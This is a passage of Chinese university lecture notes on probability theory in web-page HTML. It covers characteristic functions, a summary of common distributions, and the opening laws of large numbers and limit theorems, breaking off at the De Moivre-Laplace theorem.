<div class="arithmatex">\[
\sum_{k=1}^{\infty} m_{2k}^{-1/2k} = \infty
\]</div>
<p>(iii)</p>
<div class="arithmatex">\[
\limsup_{k \to \infty} |m_k|^{1/k} &lt; \infty
\]</div>
<p>那么</p>
<div class="arithmatex">\[
X \overset{d}{\equiv} Y
\]</div>
</div>
<h2 id="note-probability-third-_16">特征函数<a class="headerlink" href="#note-probability-third-_16" title="Permanent link">&para;</a></h2>
<p><span class="arithmatex">\((\Omega, A, P), X : \Omega \to \mathbb{R}, X \sim F_X(x)\)</span>. 定义</p>
<div class="arithmatex">\[
\varphi(t) = E e^{itX}, \quad t \in \mathbb{R}
\]</div>
<p>其中</p>
<div class="arithmatex">\[
E e^{itX} = E \cos tX + iE \sin tX
\]</div>
<p>一定存在有限。</p>
<div class="arithmatex">\[\varphi(t) : \mathbb{R} \to \mathbb{C}\]</div>
<p><mark class="critic">实变量复值函数</mark></p>
<p>目的：利用复分析研究随机变量的分布性质。</p>
<p>意义：对概率论的发展起着重要作用。</p>
<div class="admonition property">
<p class="admonition-title">常见分布的特征函数</p>
<div class="tabbed-set tabbed-alternate" data-tabs="6:7"><input checked="checked" id="note-probability-third-_16-退化分布" name="note-probability-third-__tabbed_6" type="radio" /><input id="note-probability-third-_16-两点分布" name="note-probability-third-__tabbed_6" type="radio" /><input id="note-probability-third-_16-n-bernoulli-分布" name="note-probability-third-__tabbed_6" type="radio" /><input id="note-probability-third-_16-poisson-分布" name="note-probability-third-__tabbed_6" type="radio" /><input id="note-probability-third-_16-均匀分布" name="note-probability-third-__tabbed_6" type="radio" /><input id="note-probability-third-_16-指数分布" name="note-probability-third-__tabbed_6" type="radio" /><input id="note-probability-third-_16-标准正态分布" name="note-probability-third-__tabbed_6" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_16-退化分布">退化分布</label><label for="note-probability-third-_16-两点分布">两点分布</label><label for="note-probability-third-_16-n-bernoulli-分布">n-Bernoulli 分布</label><label for="note-probability-third-_16-poisson-分布">Poisson 分布</label><label for="note-probability-third-_16-均匀分布">均匀分布</label><label for="note-probability-third-_16-指数分布">指数分布</label><label for="note-probability-third-_16-标准正态分布">标准正态分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\)</span>是一个常数<span class="arithmatex">\(c\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = e^{ict}
\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\)</span>是一个两点分布，<span class="arithmatex">\(P(X = 1) = p, \quad P(X = 0) = 1 - p\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = pe^{it} + 1 - p
\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X \sim B(n, p)\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = (1 - p + pe^{it})^n
\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X \sim P(\lambda)\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = e^{\lambda (e^{it} - 1)}
\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X \sim U(a, b)\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = \frac{e^{itb} - e^{ita}}{it(b-a)}
\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X \sim E(\lambda)\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = \frac{\lambda}{\lambda - it}
\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X \sim N(0, 1)\)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) = e^{-\frac{t^2}{2}}
\]</div>
<p>普通的正态分布</p>
<div class="arithmatex">\[
    e^{it\mu-\frac{\sigma^2t^2}{2}}
\]</div>
</div>
</div>
</div>
</div>
<h3 id="note-probability-third-_17">特征函数的分析性质<a class="headerlink" href="#note-probability-third-_17" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><span class="arithmatex">\( \varphi(0) = 1 \)</span></p>
</li>
<li>
<p><span class="arithmatex">\( |\varphi(t)| \leqslant 1 = \varphi(0) \)</span> <mark class="critic">模长有界</mark></p>
</li>
<li>
<p><span class="arithmatex">\( \varphi(-t) = \overline{\varphi(t)} \)</span> <mark class="critic">共轭对称</mark></p>
</li>
<li>
<p><span class="arithmatex">\( \varphi(t) \)</span> 在 <span class="arithmatex">\( \mathbb{R} \)</span> 上一致连续。</p>
</li>
<li>
<p>Bochner 非负定性</p>
</li>
</ol>
<p>对于任何实数 <span class="arithmatex">\( t_1, t_2, \ldots, t_n \)</span>，任何复数 <span class="arithmatex">\( a_1, a_2, \ldots, a_n \)</span></p>
<div class="arithmatex">\[
\sum_{k,l=1}^{n} a_k \bar{a_l} \varphi(t_k - t_l) \geqslant 0
\]</div>
<ol>
<li>可微性</li>
</ol>
<p>假设 <span class="arithmatex">\( E|X| &lt; \infty, \quad EX = \mu \)</span>，那么</p>
<div class="arithmatex">\[
\varphi(t) \text{ 可微}
\]</div>
<p>并且</p>
<div class="arithmatex">\[
\varphi'(0) = i\mu
\]</div>
<p>事实上，</p>
<div class="arithmatex">\[
\varphi(t) = \int_{-\infty}^{\infty} e^{itx} dF(x).
\]</div>
<p>因为</p>
<div class="arithmatex">\[
\int_{-\infty}^{\infty} |x| dF(x) &lt; \infty,
\]</div>
<p><span class="arithmatex">\(e^{itx}\)</span>求导之后被一个可积函数控制，</p>
<p>所以</p>
<div class="arithmatex">\[
\varphi'(t) = \int_{-\infty}^{\infty} ix e^{itx} dF(x)
\]</div>
<div class="arithmatex">\[
= i \int_{-\infty}^{\infty} x e^{itx} dF(x)
\]</div>
<p>类似地，如果 <span class="arithmatex">\( E|X|^k &lt; \infty \)</span>，那么</p>
<div class="arithmatex">\[
\varphi^{(k)}(t) = i^k \int_{-\infty}^{\infty} x^k e^{itx} dF(x)
\]</div>
<p>特别，如果 <span class="arithmatex">\( E|X| &lt; \infty \)</span>，那么 <span class="arithmatex">\( \varphi(t) \)</span> 在 0 处可以进行 <span class="arithmatex">\( k \)</span> 次展开：</p>
<div class="arithmatex">\[
\varphi(t) = \varphi(0) + \varphi'(0)t + \frac{\varphi''(0)}{2!} t^2 + \cdots + \frac{\varphi^{(k)}(0)}{k!} t^k + o(t^k)
\]</div>
<div class="arithmatex">\[
= 1 + iEXt - \frac{EX^2}{2} t^2 + \cdots + \frac{i^k EX^k}{k!} t^k + o(t^k), \quad t \to 0
\]</div>
<h3 id="note-probability-third-_18">特征函数的运算性质<a class="headerlink" href="#note-probability-third-_18" title="Permanent link">&para;</a></h3>
<ul>
<li>令 <span class="arithmatex">\( X \)</span> 的特征函数为 <span class="arithmatex">\( \varphi_X(t) \)</span>，那么</li>
</ul>
<div class="arithmatex">\[
E[e^{it(aX+c)}] = e^{itc} \varphi_X(at)
\]</div>
<p>如果 <span class="arithmatex">\( Y \sim N(\mu, \sigma^2) \)</span>，那么可写成</p>
<div class="arithmatex">\[
Y = \sigma X + \mu, \quad X \sim N(0, 1)
\]</div>
<p>因此，</p>
<div class="arithmatex">\[
\varphi_Y(t) = e^{i\mu t - \frac{\sigma^2 t^2}{2}}
\]</div>
<ul>
<li>令 <span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 为两个随机变量，那么</li>
</ul>
<div class="arithmatex">\[
    Z = X + Y
\]</div>
<div class="arithmatex">\[
\varphi_Z(t) = \varphi_X(t) \varphi_Y(t)
\]</div>
<p>在<mark class="critic">X,Y相互独立</mark>的情况下，这个公式成立。</p>
<p>推广：</p>
<p>如果 <span class="arithmatex">\( X_1, X_2, \ldots, X_n \)</span> 相互独立，那么</p>
<div class="arithmatex">\[
\varphi_{X_1 + X_2 + \cdots + X_n}(t) = \varphi_{X_1}(t) \varphi_{X_2}(t) \cdots \varphi_{X_n}(t)
\]</div>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p><span class="arithmatex">\(S_n \sim B(n,p)\)</span>，那么<span class="arithmatex">\(S_n =\sum_{i=1}^n X_i\)</span>，其中<span class="arithmatex">\(X_i\)</span>是独立同分布的两点分布随机变量，那么</p>
<div class="arithmatex">\[
\varphi_{S_n}(t) = \varphi_{X_1}(t) \varphi_{X_2}(t) \cdots \varphi_{X_n}(t) = (1-p+pe^{it})^n
\]</div>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>注意计算特征函数的时候不要直接把求期望放到指数上,即</p>
<div class="arithmatex">\[
    Ee^{itX} \neq e^{itEX}
\]</div>
<p>是不对的</p>
</div>
<h3 id="note-probability-third-_19">唯一性问题<a class="headerlink" href="#note-probability-third-_19" title="Permanent link">&para;</a></h3>
<p>分布函数和特征函数相互唯一确定吗?</p>
<p>假设 <span class="arithmatex">\(X\)</span> 和 <span class="arithmatex">\(Y\)</span> 的分布函数相同，那么它们的特征函数相同是显然的；</p>
<p>但是，特征函数相同，<span class="arithmatex">\(X\)</span> 和 <span class="arithmatex">\(Y\)</span> 的分布函数是否相同呢？</p>
<p>即</p>
<div class="arithmatex">\[
\varphi_X(t) = \varphi_Y(t), \quad \forall t \in \mathbb{R}
\]</div>
<p>是否能推出</p>
<div class="arithmatex">\[
F_X(x) = F_Y(x), \quad \forall x \in \mathbb{R}
\]</div>
<div class="admonition section">
<p class="admonition-title">唯一性定理</p>
<div class="arithmatex">\[
\varphi_X(t) \equiv \varphi_Y(t)
\]</div>
<p>那么</p>
<div class="arithmatex">\[
X \overset{d}{=} Y, \quad F_X(x) \equiv F_Y(x)
\]</div>
<p>实际上，</p>
<div class="arithmatex">\[
F_X(x_2) - F_X(x_1) = \lim_{T \to \infty} \frac{1}{2\pi} \int_{-T}^{T} \frac{e^{-itx_2} - e^{-itx_1}}{it} \cdot \varphi_X(t) dt
\]</div>
<p>有推论:</p>
<p>如果 <span class="arithmatex">\( X \)</span> 的特征函数 <span class="arithmatex">\( \varphi(t) \)</span> 绝对可积，即</p>
<div class="arithmatex">\[
\int_{-\infty}^{\infty} |\varphi(t)| dt
\]</div>
<p>那么 <span class="arithmatex">\( X \)</span> 具有密度函数 <span class="arithmatex">\( p(x) \)</span>，并且</p>
<div class="arithmatex">\[
p(x) = \frac{1}{2\pi} \int_{-\infty}^{\infty} e^{-itx} \varphi(t) dt
\]</div>
</div>
<p>如果是离散型，那么
假设 <span class="arithmatex">\(\varphi(t)\)</span> 是一个特征函数，如果</p>
<div class="arithmatex">\[
\varphi(t) = \sum_{k=-\infty}^{\infty} a_k e^{ikt}
\]</div>
<p>并且</p>
<div class="arithmatex">\[
a_k \geqslant 0, \quad \sum_{k=-\infty}^{\infty} a_k = 1
\]</div>
<p>那么</p>
<div class="arithmatex">\[
P(X = k) = a_k, \quad k = \ldots, -2, -1, 0, 1, 2, \ldots,
\]</div>
<p>注意，某些 <span class="arithmatex">\(a_k\)</span> 可能为 0。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设 <span class="arithmatex">\((X, Y)\)</span> 是二元联合正态随机变量</p>
<div class="arithmatex">\[
(X, Y) \sim N(\mu_1, \sigma_1^2; \mu_2, \sigma_2^2; \rho)
\]</div>
<p>求：<span class="arithmatex">\(\phi(t_1, t_2) = ?\)</span></p>
<p>为简单起见，假设 <span class="arithmatex">\(\mu_1 = 0, \sigma_1^2 = 1; \mu_2 = 0, \sigma_2^2 = 1\)</span>，即</p>
<div class="arithmatex">\[
(X, Y) \sim N(0, 1; 0, 1; \rho)
\]</div>
<p>令</p>
<div class="arithmatex">\[
\Sigma = \begin{pmatrix} 1 &amp; \rho \\ \rho &amp; 1 \end{pmatrix}
\]</div>
<p>作线性变换：</p>
<div class="arithmatex">\[
\begin{pmatrix} U \\ V \end{pmatrix} = \Sigma^{-1/2} \begin{pmatrix} X \\ Y \end{pmatrix}
\]</div>
<div class="arithmatex">\[
= \begin{pmatrix} 1 &amp; \rho \\ \rho &amp; 1 \end{pmatrix}^{-1/2} \begin{pmatrix} X \\ Y \end{pmatrix}
\]</div>
<p>这样，<span class="arithmatex">\((U, V) \sim N(0, 1; 0, 1; 0)\)</span>，即 <span class="arithmatex">\(U, V\)</span> 相互独立。所以，</p>
<div class="arithmatex">\[
\phi_{U,V}(t_1, t_2) = e^{-\frac{1}{2}(t_1^2 + t_2^2)}
\]</div>
<div class="arithmatex">\[
= e^{-\frac{1}{2}(t_1, t_2) \cdot (t_1, t_2)'}
\]</div>
<div class="arithmatex">\[
\begin{align*}
\phi_{X,Y}(t_1, t_2) &amp;= E e^{i(t_1, t_2)(X, Y)'} \\
&amp;= E e^{i(t_1, t_2) \Sigma^{1/2} (U, V)'} \\
&amp;= e^{-\frac{1}{2} (t_1, t_2) \Sigma (t_1, t_2)'}
\end{align*}
\]</div>
<p>这里最后一个等号是运用了 <span class="arithmatex">\(\phi_{U,V}\)</span>特征函数的变量替换和转置的性质；</p>
<p>这种变换的方式很好用，可以把标准联合正态分布的相关系数变为0；</p>
<div class="admonition info">
<p class="admonition-title">多元随机向量的特征函数</p>
<p>设<span class="arithmatex">\(\mathbf{X}\)</span>是一个多元随机向量,<span class="arithmatex">\(\mathbf{t}=(t_1,t_2,\ldots,t_n) \in \mathbb{R}^n\)</span>,定义</p>
<div class="arithmatex">\[
\varphi_{\mathbf{X}}(\mathbf{t}) = Ee^{i\mathbf{t}\cdot\mathbf{X}}
\]</div>
<p>即两者做内积的期望;</p>
</div>
</div>
<h2 id="note-probability-third-_20">常见分布<a class="headerlink" href="#note-probability-third-_20" title="Permanent link">&para;</a></h2>
<p>至今为止,概率论的数字特征部分已经结束,开始概率极限理论的学习之前,在此总结一下苏老师课上提到过的各种分布的表达,密度函数(或概率),期望,方差,特征函数;</p>
<div class="tabbed-set tabbed-alternate" data-tabs="7:11"><input checked="checked" id="note-probability-third-_20-退化分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-两点分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-二项分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-泊松分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-几何分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-超几何分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-均匀分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-指数分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-正态分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-卡方分布" name="note-probability-third-__tabbed_7" type="radio" /><input id="note-probability-third-_20-gamma分布" name="note-probability-third-__tabbed_7" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_20-退化分布">退化分布</label><label for="note-probability-third-_20-两点分布">两点分布</label><label for="note-probability-third-_20-二项分布">二项分布</label><label for="note-probability-third-_20-泊松分布">泊松分布</label><label for="note-probability-third-_20-几何分布">几何分布</label><label for="note-probability-third-_20-超几何分布">超几何分布</label><label for="note-probability-third-_20-均匀分布">均匀分布</label><label for="note-probability-third-_20-指数分布">指数分布</label><label for="note-probability-third-_20-正态分布">正态分布</label><label for="note-probability-third-_20-卡方分布">卡方分布</label><label for="note-probability-third-_20-gamma分布">Gamma分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>退化分布,为离散型随机变量,取某个值的概率为1,其余取值的概率为0;</p>
<p>$$
 P(X=a)=1
 $$</p>
<p>期望为<span class="arithmatex">\(E(X)=a\)</span>,方差为<span class="arithmatex">\(Var(X)=0\)</span>,特征函数为<span class="arithmatex">\(e^{ita}\)</span>;</p>
</div>
<div class="tabbed-block">
<p>即 <strong>伯努利分布</strong> ，Bernoulli distribution,离散型</p>
<div class="arithmatex">\[
\left[
\begin{matrix}
1&amp;0\\
p&amp;1-p
\end{matrix}
\right],p\in (0,1)
\]</div>
<p>可以记为<span class="arithmatex">\(X\sim B(1,p)\)</span>;</p>
<p>期望为<span class="arithmatex">\(E(X)=p\)</span>,方差为<span class="arithmatex">\(Var(X)=p(1-p)\)</span>,特征函数为<span class="arithmatex">\(pe^{it}+1-p\)</span>;</p>
</div>
<div class="tabbed-block">
<p>即 binomial distribution，离散型</p>
<div class="arithmatex">\[
P(\xi=k)=\begin{pmatrix}
    n\\k
\end{pmatrix}
p^k(1-p)^{n-k},p\in (0,1),k=0,1,\cdots,n
\]</div>
<p>记为 <span class="arithmatex">\(\xi\sim B(n,p)\)</span></p>
<p>期望为<span class="arithmatex">\(E(X)=np\)</span>,方差为<span class="arithmatex">\(Var(X)=np(1-p)\)</span>,特征函数为<span class="arithmatex">\((pe^{it}+1-p)^n\)</span>;</p>
</div>
<div class="tabbed-block">
<p>即 Poisson distribution，离散型</p>
<div class="arithmatex">\[
P(\xi=k)=\frac{\lambda^k}{k!}e^{-\lambda}
,\lambda&gt;0,k\in \mathbb N
\]</div>
<p>记为 <span class="arithmatex">\(\xi\sim\mathcal{P}(\lambda)\)</span></p>
<p>期望和方差均为<span class="arithmatex">\(\lambda\)</span>,特征函数为<span class="arithmatex">\(e^{\lambda(e^{it}-1)}\)</span>,使用凑成泰勒展开推导;</p>
</div>
<div class="tabbed-block">
<p>即 geometry distribution,一般用于解决第一次成功的问题,离散型</p>
<div class="arithmatex">\[
P(\xi=k)=p(1-p)^{k-1},p\in (0,1),k\in \mathbb{N}_+
\]</div>
<p>可以记为<span class="arithmatex">\(X\sim G(p)\)</span>;(Geometric distribution)</p>
<p>期望为<span class="arithmatex">\(E(X)=\frac{1}{p}\)</span>,方差为<span class="arithmatex">\(Var(X)=\frac{1-p}{p^2}\)</span>,特征函数为<span class="arithmatex">\(\frac{pe^{it}}{1-(1-p)e^{it}}\)</span>;推导过程是等比数列求和.</p>
</div>
<div class="tabbed-block">
<p>即 hypergeometry distribution，一般用于解决次品抽样问题,离散型</p>
<div class="arithmatex">\[
P(\xi=k)=\frac{\displaystyle
\begin{pmatrix}
    M\\k
\end{pmatrix}
\begin{pmatrix}
    N-M\\n-k
\end{pmatrix}
    }{\displaystyle
\begin{pmatrix}
    N\\n
\end{pmatrix}}
,n\leqslant N,M\leqslant N,k=0,1,\cdots, \min\{n,M\}
\]</div>
<p>可以记为<span class="arithmatex">\(X\sim H(N,M,n)\)</span>;(Hypergeometry distribution)</p>
<p>期望为<span class="arithmatex">\(E(X)=\frac{nM}{N}\)</span>,方差为<span class="arithmatex">\(Var(X)=\frac{nM}{N}(1-\frac{M}{N})(\frac{N-n}{N-1})\)</span>,特征函数似乎没见过;</p>
</div>
<div class="tabbed-block">
<p>即 uniform distribution,连续型,有密度函数</p>
<div class="arithmatex">\[
f(x)=\begin{cases}
\frac{1}{b-a},&amp;a&lt;x&lt;b\\
0,&amp;x\leqslant a \text{ or } x\geqslant b
\end{cases}
\]</div>
<p>记为<span class="arithmatex">\(X\sim U(a,b)\)</span>;</p>
<p>数学期望为<span class="arithmatex">\(E(X)=\frac{a+b}{2}\)</span>,方差为<span class="arithmatex">\(Var(X)=\frac{(b-a)^2}{12}\)</span>,特征函数为<span class="arithmatex">\(\frac{e^{itb}-e^{ita}}{it(b-a)}\)</span>;三者推导都是无情积分;</p>
</div>
<div class="tabbed-block">
<p>即 exponential distribution,连续型</p>
<div class="arithmatex">\[
f(x)=\begin{cases}
\lambda e^{-\lambda x},&amp;x\geqslant 0\\
0,&amp;x&lt;0
\end{cases}
\]</div>
<p>记为<span class="arithmatex">\(X\sim E(\lambda)\)</span>;</p>
<p>数学期望为<span class="arithmatex">\(E(X)=\frac{1}{\lambda}\)</span>,方差为<span class="arithmatex">\(Var(X)=\frac{1}{\lambda^2}\)</span>,特征函数为<span class="arithmatex">\(\frac{\lambda}{\lambda-it}\)</span>;</p>
</div>
<div class="tabbed-block">
<p>即 normal distribution,连续型,有密度函数</p>
<div class="arithmatex">\[
f(x)=\frac{1}{\sqrt{2\pi}\sigma}e^{-\frac{(x-\mu)^2}{2\sigma^2}}
\]</div>
<p>记为<span class="arithmatex">\(X\sim N(\mu,\sigma^2)\)</span>;</p>
<p>数学期望为<span class="arithmatex">\(E(X)=\mu\)</span>,方差为<span class="arithmatex">\(Var(X)=\sigma^2\)</span>,特征函数为<span class="arithmatex">\(e^{i\mu t-\frac{1}{2}\sigma^2 t^2}\)</span>;
特别地，<span class="arithmatex">\(X\sim N(0,1)\)</span>称为标准正态分布;其特征函数为<span class="arithmatex">\(e^{-\frac{1}{2}t^2}\)</span>;</p>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(\xi_1,\xi_2,\cdots,\xi_n\)</span>独立同分布于标准正态分布<span class="arithmatex">\(N(0,1)\)</span>,则称<span class="arithmatex">\(\xi_1^2+\xi_2^2+\cdots+\xi_n^2\)</span>服从卡方分布,为连续型</p>
<p>有密度函数</p>
<div class="arithmatex">\[
 f(x)=\frac{1}{2^{\frac{v}{2}}\Gamma(\frac{v}{2})}x^{\frac{v}{2}-1}e^{-\frac{x}{2}}
\]</div>
<p>记为<span class="arithmatex">\(\chi^2 \sim \chi^2(v)\)</span>;</p>
<p><span class="arithmatex">\(v\)</span> 为自由度,指的是自由变量的个数(<span class="arithmatex">\(n-r\)</span>),<span class="arithmatex">\(r\)</span> 为约束条件的个数;</p>
<p>期望为<span class="arithmatex">\(E(\chi^2)=v\)</span>,方差为<span class="arithmatex">\(Var(\chi^2)=2v\)</span>,特征函数为<span class="arithmatex">\((1-2it)^{-\frac{v}{2}}\)</span>;</p>
<p>记忆较为繁琐,可以只记住伽马分布即可;</p>
</div>
<div class="tabbed-block">
<p>即 Gamma distribution,连续型,有密度函数</p>
<div class="arithmatex">\[
f(x)=\frac{\lambda^\alpha}{\Gamma(\alpha)}x^{\alpha-1}e^{-\lambda x}
\]</div>
<p>记为<span class="arithmatex">\(X\sim \Gamma(\alpha,\lambda)\)</span>;</p>
<p>期望为<span class="arithmatex">\(E(X)=\frac{\alpha}{\lambda}\)</span>,方差为<span class="arithmatex">\(Var(X)=\frac{\alpha}{\lambda^2}\)</span>;</p>
<p>特征函数为<span class="arithmatex">\((1-\dfrac{it}{\lambda})^{-\alpha}\)</span>;</p>
<p>可以看到令<span class="arithmatex">\(\lambda=\dfrac{1}{2},\alpha=\dfrac{v}{2}\)</span>时,<span class="arithmatex">\(\Gamma\)</span>分布即为<span class="arithmatex">\(\chi^2\)</span>分布;</p>
</div>
</div>
</div></section><section class="print-page" id="note-probability-fourth" heading-number="2.3.2.5"><h1 id="note-probability-fourth-_1">概率极限理论<a class="headerlink" href="#note-probability-fourth-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2138 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<h2 id="note-probability-fourth-_2">伯努利大数定律<a class="headerlink" href="#note-probability-fourth-_2" title="Permanent link">&para;</a></h2>
<p>给定<span class="arithmatex">\(p \in (0, 1)\)</span>，记<span class="arithmatex">\(S_n \sim \text{Binomial}(n, p)\)</span>，则</p>
<div class="arithmatex">\[
    P(w: \lvert \frac{S_n(w)}{n} - p \rvert \geqslant \epsilon) \to 0 \quad (n \to \infty)
\]</div>
<p>即频率与概率的偏差的概率随着试验次数的增加而趋近于0</p>
<h2 id="note-probability-fourth-possion">Possion 极限定理<a class="headerlink" href="#note-probability-fourth-possion" title="Permanent link">&para;</a></h2>
<p>令 <span class="arithmatex">\(0 &lt; p_n &lt; 1\)</span>，假设 <span class="arithmatex">\(S_n \sim B(n, p_n)\)</span>，如果 <span class="arithmatex">\(np_n \to \lambda\)</span>，并且 <span class="arithmatex">\(0 &lt; \lambda &lt; 1\)</span> 那么对任何 <span class="arithmatex">\(k = 0, 1, 2, \ldots\)</span></p>
<div class="arithmatex">\[
P(S_n = k) \to \frac{\lambda^k e^{-\lambda}}{k!}, \quad n \to \infty
\]</div>
<p>证明：由于 <span class="arithmatex">\(S_n \sim B(n, p_n)\)</span></p>
<div class="arithmatex">\[
P(S_n = k) = \frac{n!}{k!(n-k)!} p_n^k (1-p_n)^{n-k}
\]</div>
<div class="arithmatex">\[
= \frac{1}{k!} \cdot \frac{n(n-1)\cdots(n-k+1)}{n^k} \cdot (np_n)^k \cdot \left(1 - \frac{\lambda}{n} + o\left(\frac{1}{n}\right)\right)^{n-k}
\]</div>
<div class="arithmatex">\[
\to \frac{\lambda^k e^{-\lambda}}{k!}, \quad n \to \infty
\]</div>
<h2 id="note-probability-fourth-chebyshev">Chebyshev 大数律<a class="headerlink" href="#note-probability-fourth-chebyshev" title="Permanent link">&para;</a></h2>
<p><strong>Chebyshev 不等式</strong>: 对任意随机变量 <span class="arithmatex">\(X\)</span>, <span class="arithmatex">\(EX\)</span> 和 <span class="arithmatex">\(EX^2\)</span> 存在有限, 那么对任意 <span class="arithmatex">\(\varepsilon &gt; 0\)</span></p>
<div class="arithmatex">\[
P(|X - EX| &gt; \varepsilon) \leqslant \frac{Var(X)}{\varepsilon^2}
\]</div>
<div class="admonition example">
<p class="admonition-title">应用 Chebyshev 不等式证明 Bernoulli 大数律</p>
<div class="arithmatex">\[
P\left(\left|\frac{S_n}{n} - p\right| &gt; \varepsilon\right) = P(|S_n - np| &gt; n\varepsilon)
\]</div>
<div class="arithmatex">\[
\leqslant \frac{Var(S_n - np)}{n^2 \varepsilon^2}
\]</div>
<div class="arithmatex">\[
= \frac{np(1-p)}{n^2 \varepsilon^2} \to 0, \quad n \to \infty
\]</div>
</div>
<p><strong>Chebyshev 大数律</strong></p>
<p>假设 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列随机变量，<span class="arithmatex">\(E\xi_k = \mu\)</span>。记 <span class="arithmatex">\(S_n = \sum_{k=1}^{n} \xi_k\)</span>，如果</p>
<div class="arithmatex">\[
\frac{Var(S_n)}{n^2} \to 0, \quad n \to \infty
\]</div>
<p>那么</p>
<div class="arithmatex">\[
\frac{S_n}{n} \to \mu, \quad n \to \infty
\]</div>
<p>更一般地，假设 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列随机变量，<span class="arithmatex">\(E\xi_k = \mu_k\)</span>。如果</p>
<div class="arithmatex">\[
\frac{Var(S_n)}{n^2} \to 0, \quad n \to \infty
\]</div>
<p>那么</p>
<div class="arithmatex">\[
\frac{S_n}{n} - \frac{\sum_{k=1}^{n} \mu_k}{n} \to 0, \quad n \to \infty
\]</div>
<div class="admonition proof">
<p class="admonition-title">Chebyshev 大数律的证明</p>
<p>对任意 <span class="arithmatex">\(\varepsilon &gt; 0\)</span>,</p>
<div class="arithmatex">\[
P\left(\left|\frac{S_n}{n} - \frac{\sum_{k=1}^{n} \mu_k}{n}\right| &gt; \varepsilon\right) \leqslant \frac{Var(S_n)}{n^2 \varepsilon^2} \to 0
\]</div>
<p>这里<span class="arithmatex">\(S_n\)</span> 对应Chebyshev不等式中的<span class="arithmatex">\(X\)</span>，<span class="arithmatex">\(\sum_{k=1}^{n} \mu_k\)</span> 对应Chebyshev不等式中的<span class="arithmatex">\(\mu\)</span></p>
<p><span class="arithmatex">\(n\varepsilon\)</span> 对应Chebyshev不等式中的<span class="arithmatex">\(\varepsilon\)</span></p>
<p>Chebyshev 大数律的意义:
1. 样本均值渐近逼近均值</p>
<ol>
<li>
<p><mark class="critic">没有独立性要求</mark></p>
</li>
<li>
<p>Chebyshev 大数律的不足之处: <mark class="critic">要求方差存在</mark></p>
</li>
</ol>
</div>
<h2 id="note-probability-fourth-khinchin">Khinchin 大数律<a class="headerlink" href="#note-probability-fourth-khinchin" title="Permanent link">&para;</a></h2>
<p>假设 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列<mark class="critic">独立同分布</mark>的随机变量，且 <span class="arithmatex">\(E\xi_k = \mu\)</span>，记 <span class="arithmatex">\(S_n = \sum_{k=1}^{n} \xi_k\)</span>，那么</p>
<div class="arithmatex">\[
\frac{S_n}{n} \to \mu, \quad n \to \infty
\]</div>
<h2 id="note-probability-fourth-de-moivre-laplace">De Moivre-Laplace 中心极限定理<a class="headerlink" href="#note-probability-fourth-de-moivre-laplace" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">De Moivre公式</p>
<div class="arithmatex">\[
    (\cos \theta + i \sin \theta)^n = \cos n\theta + i \sin n\theta
\]</div>
</div>
<p>假设 <span class="arithmatex">\(S_n \sim B(n, p)\)</span>，那么</p>
